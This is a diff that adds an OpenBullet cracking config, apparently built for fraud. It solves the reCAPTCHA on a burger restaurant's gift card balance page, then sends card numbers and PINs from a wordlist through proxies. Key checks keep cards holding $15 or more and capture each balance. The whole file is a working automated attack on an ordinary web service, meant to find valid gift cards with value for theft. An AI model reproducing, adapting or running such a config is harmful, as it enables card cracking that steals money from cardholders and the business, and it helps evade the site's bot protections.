@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "BAB GC",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-11T04:19:19.0820936+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://burgersandbeer.cardfoundry.com/giftcards.php?action=card_balance" "6LcSmyYTAAAAAKJ0mxOVjTr066pH2g3wSV1MVo0G" -> VAR "RECAP" 
+REQUEST POST "https://burgersandbeer.cardfoundry.com/giftcards.php?action=solve_captcha" AutoRedirect=TRUE 
+  CONTENT "captcha_url=card_balance&g-recaptcha-response=<RECAP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://burgersandbeer.cardfoundry.com/giftcards.php?action=card_balance" 
+  HEADER "Origin: https://burgersandbeer.cardfoundry.com" 
+REQUEST POST "https://burgersandbeer.cardfoundry.com/giftcards.php" AutoRedirect=TRUE 
+  CONTENT "action=check_card_balance&val=<USER>&pin=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_MINIMUM PARSE "<>" LR "" "" Recursive=FALSE -> VAR "MIN" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+    KEY "<MIN>" GreaterThan "14.00" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+    KEY "$0.00" 
+    KEY "<MIN>" LessThan "15.00" 
+PARSE "<SOURCE>" LR "$" "\"" Recursive=FALSE -> CAP "BALANCE" "$" "" 
